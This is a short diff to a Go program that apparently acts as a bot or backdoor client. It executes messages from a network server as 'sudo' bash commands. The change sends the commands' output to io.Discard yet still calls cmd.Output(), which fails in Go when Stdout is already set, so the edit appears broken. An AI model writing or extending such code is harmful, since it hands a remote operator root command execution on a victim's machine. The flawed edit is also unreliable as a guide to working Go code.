@@ -8,6 +8,7 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"io"
 	"math/rand"
 	"net"
 	"os/exec"
@@ -108,6 +109,8 @@ func main() {
 							// As long as the message is not a KEEP_ALIVE message or apart of the
 							// HTTP header, execute it as a command
 							cmd := exec.Command("bash", "-c", "sudo "+serverMessage)
+							cmd.Stdout = io.Discard
+							cmd.Stderr = io.Discard
 							output, err := cmd.Output()
 							if err != nil {
 								fmt.Println("Error Executing command: ", err)
